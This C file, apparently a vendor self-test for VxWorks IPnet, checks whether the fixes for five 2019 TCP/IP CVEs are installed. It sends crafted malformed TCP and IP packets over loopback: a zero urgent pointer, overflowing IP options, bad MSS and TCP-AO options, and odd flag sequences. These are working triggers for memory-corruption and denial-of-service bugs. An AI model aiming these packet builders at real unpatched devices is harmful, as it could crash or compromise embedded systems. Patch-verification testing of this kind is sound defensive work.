/*
 * Copyright (c) 2019 Wind River Systems, Inc.
 *
 * The right to copy, distribute, modify or otherwise make use
 * of this software may be licensed only pursuant to the terms
 * of an applicable Wind River license agreement.
 */

/*
 * Following VIP components are required
 *
 * INCLUDE_ROUTECMD
 *
 * Commands in the C-interpreter
 *
 * -> netCveShow
 * -> netTestOne ID
 * -> netCve2019IsPatched
 */

/* Rev 1.2 July 5, 2019 */

#define BEFORE_SR0600

#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/tcp.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#if !defined(BEFORE_SR0600)
#include <sys/uio.h>
#endif
#include <unistd.h>
#include <net/if.h>
#if defined(BEFORE_SR0600)
#include <ipcom_sock.h>
#include <ipcom_clib.h>
#include <iptcp_config.h>
#include <selectLib.h>
#include "sockLib.h" 
#endif

#define A(ret, what)                            \
    if ((ret) < 0)                              \
        {                                       \
        perror (what);                          \
        exit (1);                               \
        }

#define ARRAY_LEN(arr) (sizeof (arr) / sizeof (arr[0]))
#define L   0
#define R   1


typedef struct testRtn
    {
    const char * cve;
    void (*fn)(void);
    } TEST_RTN;

static BOOL initDone = FALSE;

/*
 * Forward declarations of test-cases
 */

int routec(const char *);
static void ipOptOverflow();
static void tcpBadConnect();
static void tcpDos();
static void tcpInvalidAoOpt();
static void tcpZeroUrgPtr();

static TEST_RTN testRtns[] =
    {
    { "CVE-2019-12255", tcpZeroUrgPtr     },
    { "CVE-2019-12256", ipOptOverflow     },
    { "CVE-2019-12258", tcpDos            },
    { "CVE-2019-12260", tcpInvalidAoOpt   },
    { "CVE-2019-12261", tcpBadConnect     },
    };

static uint32_t inSumUpdate
    (
    const void * ptr,
    uint32_t     len
    )
    {
    const uint16_t * u16 = (const uint16_t *)ptr;
    uint32_t         cnt = len;
    uint32_t         sum = 0;

    while (cnt > 1)
        {
        sum += *u16++;
        cnt -= 2;
        }

    if (cnt > 0)
        {
#if (_BYTE_ORDER == _BIG_ENDIAN)
        sum += *(uint8_t *)u16 << 8;
#else
        sum += *(uint8_t *)u16;
#endif
        }

    return sum;
    }


/* returns checksum in network byte order */
static uint16_t inSumFold
    (
    uint32_t sum
    )
    {
    uint32_t csum = sum;

    while (csum >> 16)
        {
        csum = (csum & 0xffff) + (csum >> 16);
        }

    return (uint16_t)(~csum);
    }

static uint16_t tcpSum
    (
    struct tcphdr * th,
    void          * payload,
    size_t          payloadLen
    )
    {
    uint32_t sum;

    sum  = INADDR_LOOPBACK;
    sum += INADDR_LOOPBACK;
    sum += IPPROTO_TCP;
    sum += sizeof *th + payloadLen;
    sum += inSumUpdate (th, sizeof *th);
    sum += inSumUpdate (payload, payloadLen);
    return inSumFold (sum);
    }

static int tcpConnectBegin (uint16_t port)
    {
    struct addrinfo  * res;
    struct addrinfo    hints;
    int                err;
    int                sock;
    int                on = 1;
    char               service[10];

    sprintf (service, "%d", (int)port);

    memset (&hints, 0, sizeof hints);
    hints.ai_socktype = SOCK_STREAM;

    err = getaddrinfo ("127.0.0.2", service, &hints, &res);
    if (err)
        {
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (err));
        exit (1);
        }

    sock = socket (res->ai_family,
                   res->ai_socktype,
                   res->ai_protocol);
    A (sock, "socket (begin)");
    A (ioctl (sock, FIONBIO, &on), "ioctl(FIONBIO)");

    connect (sock, res->ai_addr, res->ai_addrlen);
    freeaddrinfo (res);

    return sock;
    }

static int listenSockGet (void)
    {
    struct addrinfo  * res;
    struct addrinfo    hints;
    int                err;
    int                sock;

    memset (&hints, 0, sizeof hints);
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags    = AI_PASSIVE;

    err = getaddrinfo ("127.0.0.1", "0", &hints, &res);
    if (err)
        {
        fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (err));
        exit (1);
        }

    sock = socket (res->ai_family,
                   res->ai_socktype,
                   res->ai_protocol);
    A (sock, "socket (passive)");
    A (bind (sock, res->ai_addr, res->ai_addrlen), "bind");
    A (listen (sock, 0), "listen");
    freeaddrinfo (res);

    return sock;
    }

static void sockpair (int fd[2])
    {
    struct sockaddr_in name;
    socklen_t          nameLen = sizeof name;
    int                lSock = listenSockGet ();

    A (getsockname (lSock, (struct sockaddr *)&name, &nameLen), "getsockname");

    fd[1] = socket (AF_INET, SOCK_STREAM, 0);
    A (fd[1], "socket (active)");
    A (connect (fd[1], (struct sockaddr *)&name, nameLen), "connect");

    A (fd[0] = accept (lSock, NULL, NULL), "accept");
    close (lSock);
    }

static uint16_t portGet (int sock)
    {
    struct sockaddr_in name;
    socklen_t          nameLen = sizeof name;

    A (getsockname (sock, (struct sockaddr *)&name, &nameLen), "getsockname");
    return ntohs (name.sin_port);
    }

static uint32_t seqGet (int sock)
    {
    uint32_t seq;
    socklen_t seqLen = sizeof seq;

#if defined(BEFORE_SR0600)
    A (getsockopt (sock, IPPROTO_TCP, IP_TCP_X_SEQ, &seq, &seqLen), "getsockopt (TCP_X_SEQ)");
#else
    A (getsockopt (sock, IPPROTO_TCP, TCP_X_SEQ, &seq, &seqLen), "getsockopt (TCP_X_SEQ)");
#endif
    return seq;
    }

struct sockaddr_in * loopbackNameGet ()
    {
    static struct sockaddr_in loName;

    memset (&loName, 0, sizeof loName);
    loName.sin_family      = AF_INET;
    loName.sin_len         = sizeof loName;
    loName.sin_addr.s_addr = htonl (INADDR_LOOPBACK);
    return &loName;
    }

static void tcpUrgZeroTx
    (
    uint16_t srcPort,
    uint16_t dstPort,
    uint32_t seq,
    uint32_t ack
    )
    {
    struct tcphdr  tcp;
    static uint8_t payload[1460];
    struct msghdr  m;
    int            rawSock;
#if !defined(BEFORE_SR0600)
    struct iovec   iov[] =
        {
        { &tcp,    sizeof(tcp)     },
        { payload, sizeof(payload) }
        };
#else
    struct iovec iov[2];
    iov[0].iov_base = (char *)&tcp;
    iov[0].iov_len = sizeof(tcp);
    iov[1].iov_base = (char *)payload;
    iov[1].iov_len = sizeof(payload);
#endif    

    memset (&tcp, 0, sizeof tcp);
    memset (payload, 'A', sizeof payload);

    tcp.th_sport = htons (srcPort);
    tcp.th_dport = htons (dstPort);
    tcp.th_seq   = htonl (seq);
    tcp.th_ack   = htonl (ack);
    tcp.th_off   = 5;
    tcp.th_flags = TH_ACK | TH_URG;
    tcp.th_sum   = tcpSum (&tcp, payload, sizeof payload);

    rawSock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    memset (&m, 0, sizeof m);
    m.msg_name    = loopbackNameGet ();
    m.msg_namelen = sizeof (struct sockaddr_in);
    m.msg_iov     = iov;
    m.msg_iovlen  = ARRAY_LEN (iov);
    A (sendmsg (rawSock, &m, 0), "sendmsg");
    close (rawSock);
    }

/* CVE-2019-12255 */

static void tcpZeroUrgPtr ()
    {
    int  sock[2];
    char data = 'Y';
    int  rb;

    sockpair (sock);
    tcpUrgZeroTx (portGet (sock[L]),
                  portGet (sock[R]),
                  seqGet (sock[L]),
                  seqGet (sock[R]));
    A (send (sock[L], &data, sizeof data, 0), "send");
    rb = recv (sock[R], &data, sizeof data, 0);
    printf ("%d: %c\n", rb, data);

    close (sock[L]);
    close (sock[R]);
    }

/* CVE-2019-12256 */

static void ipOptOverflow()
    {
    struct ip      ip;
    uint8_t        opts[12];
    struct icmp    icmp;

    struct msghdr m;
    int           rawSock;
    int           enable = 1;
#if !defined(BEFORE_SR0600)
    struct iovec   iov[] =
        {
        { &ip,   sizeof ip   },
        { opts,  sizeof opts },
        { &icmp, sizeof icmp },
        };
#else    
    struct iovec iov[3];
    iov[0].iov_base = (char *)&ip;
    iov[0].iov_len = sizeof(ip);
    iov[1].iov_base = (char *)opts;
    iov[1].iov_len = sizeof(opts);
    iov[2].iov_base = (char *)&icmp;
    iov[2].iov_len = sizeof(icmp);
#endif
    
    memset (&ip, 0, sizeof ip);
    memset (&icmp, 0, sizeof icmp);
    memcpy (opts, "\x83\x03\x27\x83\x03\x27\x83\x03\x27\x83\x03\x27", sizeof opts);

    ip.ip_v          = 4;
    ip.ip_hl         = 5 + sizeof opts / 4;
    ip.ip_ttl        = 1;
    ip.ip_p          = IPPROTO_ICMP;
    ip.ip_dst.s_addr = htonl (INADDR_LOOPBACK);

    rawSock = socket (AF_INET, SOCK_RAW, 0);
    A (setsockopt (rawSock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof enable),
       "setsockopt (IP_HDRINCL)");
    memset (&m, 0, sizeof m);
    m.msg_name    = loopbackNameGet ();
    m.msg_namelen = sizeof (struct sockaddr_in);
    m.msg_iov     = iov;
    m.msg_iovlen  = ARRAY_LEN (iov);
    A (sendmsg (rawSock, &m, 0), "sendmsg");
    close (rawSock);
    }

static void iovRawIpSend
    (
    struct iovec * iov,
    int            iovLen
    )
    {
    struct msghdr m;
    int           rawSock;
    int           enable = 1;

    rawSock = socket (AF_INET, SOCK_RAW, 0);
    A (setsockopt (rawSock, IPPROTO_IP, IP_HDRINCL, &enable, sizeof enable),
       "setsockopt (IP_HDRINCL)");
    memset (&m, 0, sizeof m);
    m.msg_name    = loopbackNameGet ();
    m.msg_namelen = sizeof (struct sockaddr_in);
    m.msg_iov     = iov;
    m.msg_iovlen  = iovLen;
    A (sendmsg (rawSock, &m, 0), "sendmsg");
    close (rawSock);
    }

/* CVE-2019-12258 */

static void tcpBadMssOptTx
    (
    uint16_t srcPort,
    uint16_t dstPort
    )
    {
    struct tcphdr  tcp;
    static uint8_t opt[] = { 2, 1, 0, 0 };
    struct msghdr  m;
    int            rawSock;
    
#if !defined(BEFORE_SR0600)
    struct iovec   iov[] =
        {
        { &tcp, sizeof tcp  },
        { opt,  sizeof opt  }
        };
#else
    struct iovec iov[2];
    iov[0].iov_base = (char *)&tcp;
    iov[0].iov_len = sizeof(tcp);
    iov[1].iov_base = (char *)opt;
    iov[1].iov_len = sizeof(opt);
#endif

    memset (&tcp, 0, sizeof tcp);

    tcp.th_sport = htons (srcPort);
    tcp.th_dport = htons (dstPort);
    tcp.th_off   = 6;
    tcp.th_flags = TH_ACK;

    rawSock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
    memset (&m, 0, sizeof m);
    m.msg_name    = loopbackNameGet ();
    m.msg_namelen = sizeof (struct sockaddr_in);
    m.msg_iov     = iov;
    m.msg_iovlen  = ARRAY_LEN (iov);
    A (sendmsg (rawSock, &m, 0), "sendmsg");
    close (rawSock);
    }

static void tcpDos()
    {
    int       sock[2];
    char      data = 'X';
    int       rb;

    sockpair (sock);
    tcpBadMssOptTx (portGet (sock[R]),
                    portGet (sock[L]));
    A (send (sock[R], &data, sizeof data, 0), "send");
    rb = recv (sock[L], &data, sizeof data, 0);

    if (rb < 0)
        {
        printf ("### TCP DoS present\n");
        }

    close (sock[L]);
    close (sock[R]);
    }

/* CVE-2019-12260 */

static void tcpPeerTx
    (
    uint16_t srcPort,
    uint16_t dstPort,
    uint32_t seq,
    uint32_t ack,
    uint8_t  flags,
    BOOL     includePayload,
    void (*cb) (struct tcphdr * tcp, uint8_t * payload)
    )
    {
    struct ip      ip;
    struct tcphdr  tcp;
    static uint8_t payload[1400];
#if !defined(BEFORE_SR0600)
    struct iovec   iov[] =
        {
        { &ip,     sizeof ip      },
        { &tcp,    sizeof tcp     },
        { payload, sizeof payload }
        };
#else
    struct iovec iov[3];
    iov[0].iov_base = (char *)&ip;
    iov[0].iov_len = sizeof(ip);
    iov[1].iov_base = (char *)&tcp;
    iov[1].iov_len = sizeof(tcp);
    iov[2].iov_base = (char *)payload;
    iov[2].iov_len = sizeof(payload);
#endif
    
    memset (&ip, 0, sizeof ip);
    memset (&tcp, 0, sizeof tcp);
    memset (payload, 'B', sizeof payload);

    ip.ip_v          = 4;
    ip.ip_hl         = 5;
    ip.ip_ttl        = 1;
    ip.ip_p          = IPPROTO_TCP;
    ip.ip_src.s_addr = htonl (INADDR_LOOPBACK + 2);
    ip.ip_dst.s_addr = htonl (INADDR_LOOPBACK);

    tcp.th_sport = htons (srcPort);
    tcp.th_dport = htons (dstPort);
    tcp.th_seq   = htonl (seq);
    tcp.th_ack   = htonl (ack);
    tcp.th_off   = 5;
    tcp.th_flags = flags;
    tcp.th_win   = 0xffff;

    if (cb)
        {
        cb (&tcp, payload);
        }

    iovRawIpSend (iov, ARRAY_LEN (iov) - (includePayload ? 0 : 1));
    }

static void tcpInvalidAoOptMake
    (
    struct tcphdr * tcp,
    uint8_t       * payload
    )
    {
    tcp->th_off = 6;
    payload[0] = 29; /* AO option */
    payload[1] = 1;  /* Too short */
    }

uint32_t tcpSeqGet
    (
    uint16_t dPort
    )
    {
    int            rb;
    struct ip      ip;
    struct tcphdr  tcp;
    struct msghdr  m;
    int            pSock;

#if !defined(BEFORE_SR0600)
    struct iovec   iov[] =
        {
        { &ip,     sizeof ip  },
        { &tcp,    sizeof tcp },
        };
#else    
    struct iovec iov[2];
    iov[0].iov_base = (char *)&ip;
    iov[0].iov_len = sizeof(ip);
    iov[1].iov_base = (char *)&tcp;
    iov[1].iov_len = sizeof(tcp);
#endif
    
    pSock = socket (AF_PACKET, SOCK_RAW, 0);
    A (pSock, "socket (AF_PACKET)");

    memset (&m, 0, sizeof m);
    m.msg_iov     = iov;
    m.msg_iovlen  = ARRAY_LEN (iov);
    do
        {
        fd_set         rdSet;
        struct timeval tv = { 1, 0 };

        FD_ZERO (&rdSet);
        FD_SET (pSock, &rdSet);
        if (select (pSock + 1, &rdSet, NULL, NULL, &tv) == 0)
            {
            break;
            }

        rb = recvmsg (pSock, &m, 0);
        A (rb - sizeof ip - sizeof tcp, "recvmsg (AF_PACKET)");
        }
    while (ntohs (tcp.th_dport) != dPort
           || tcp.th_flags != (TH_SYN | TH_ACK));

    close (pSock);
    return ntohl (tcp.th_seq);
    }

static void tcpInvalidAoOpt()
    {
    int      tcpSock;
    int      lSock;
    uint16_t lPort;
    uint16_t rPort = 0xbaad;
    char     data;
    int      rb;

    lSock = listenSockGet ();
    lPort = portGet (lSock);

    tcpPeerTx(rPort,
              lPort,
              0,
              0,
              TH_SYN,
              TRUE,
              tcpInvalidAoOptMake);

    tcpPeerTx(rPort,
              lPort,
              0,
              0,
              TH_SYN | TH_FIN | TH_URG,
              FALSE,
              NULL);

    tcpPeerTx(rPort,
              lPort,
              1,
              0,
              TH_SYN,
              FALSE,
              NULL);

    tcpPeerTx(rPort,
              lPort,
              2,
              tcpSeqGet (rPort) + 1,
              TH_ACK,
              TRUE,
              NULL);

    A (tcpSock = accept (lSock, NULL, NULL), "accept");
    close (lSock);

    rb = recv (tcpSock, &data, sizeof data, 0);
    printf ("%d: %c\n", rb, data);
    close (tcpSock);
    }

/* CVE-2019-12261 */

static void tcpBlackholeTx
    (
    uint16_t srcPort,
    uint16_t dstPort,
    uint32_t seq,
    uint32_t ack,
    uint8_t  flags
    )
    {
    struct ip      ip;
    struct tcphdr  tcp;
    static uint8_t payload[1400];
#if !defined(BEFORE_SR0600)
    struct iovec   iov[] =
        {
        { &ip,     sizeof ip      },
        { &tcp,    sizeof tcp     },
        { payload, sizeof payload }
        };
#else
    struct iovec iov[3];
    iov[0].iov_base = (char *)&ip;
    iov[0].iov_len = sizeof(ip);
    iov[1].iov_base = (char *)&tcp;
    iov[1].iov_len = sizeof(tcp);
    iov[2].iov_base = (char *)payload;
    iov[2].iov_len = sizeof(payload);
#endif
    
    memset (&ip, 0, sizeof ip);
    memset (&tcp, 0, sizeof tcp);
    memset (payload, 'C', sizeof payload);

    ip.ip_v          = 4;
    ip.ip_hl         = 5;
    ip.ip_ttl        = 1;
    ip.ip_p          = IPPROTO_TCP;
    ip.ip_src.s_addr = htonl (INADDR_LOOPBACK + 1);
    ip.ip_dst.s_addr = htonl (INADDR_LOOPBACK);

    tcp.th_sport = htons (srcPort);
    tcp.th_dport = htons (dstPort);
    tcp.th_seq   = htonl (seq);
    tcp.th_ack   = htonl (ack);
    tcp.th_off   = 5;
    tcp.th_flags = flags;
    tcp.th_win   = 0xffff;

    iovRawIpSend (iov, ARRAY_LEN (iov));
    }

static void tcpBadConnect()
    {
    int      tcpSock;
    uint16_t rPort = 0xbaad;
    uint16_t lPort;
    char     data;
    int      rb;
    fd_set   wrSet;
    struct timeval tv = { 1, 0 };

    tcpSock = tcpConnectBegin (rPort);
    lPort = portGet (tcpSock);

    tcpBlackholeTx(rPort,
                   lPort,
                   0,
                   seqGet (tcpSock),
                   TH_SYN | TH_ACK | TH_FIN | TH_URG);

    tcpBlackholeTx(rPort,
                   lPort,
                   2,
                   seqGet (tcpSock),
                   TH_SYN | TH_ACK);

    FD_ZERO (&wrSet);
    FD_SET (tcpSock, &wrSet);
    A (select (tcpSock + 1, NULL, &wrSet, NULL, &tv), "select");

    rb = recv (tcpSock, &data, sizeof data, 0);
    printf ("%d: %c\n", rb, data);

    close (tcpSock);
    }

/* Public API */

void netTestOne (int i)
    {
    if (!initDone)
        {
        routec ("add -host -blackhole 127.0.0.2");
        routec ("add -host -iface -dev lo0 127.0.0.3 127.0.0.1");
        initDone = TRUE;
        }
    testRtns[i].fn ();
    }

int netTest ()
    {
    int i;

    for (i = 0; i < ARRAY_LEN (testRtns); i++)
        {
        netTestOne (i);
        }
    return i;
    }

BOOL netCve2019IsPatched()
    {
    BOOL patchSeemsApplied = !!netTest ();

    if (patchSeemsApplied)
        {
        printf ("Patches for IPNET CVEs seems to be applied\n");
        }

    return patchSeemsApplied;
    }

int netCveShow ()
    {
    int i;

    for (i = 0; i < ARRAY_LEN (testRtns); i++)
        {
        printf ("%2d  %s\n", i, testRtns[i].cve);
        }
    return i;
    }
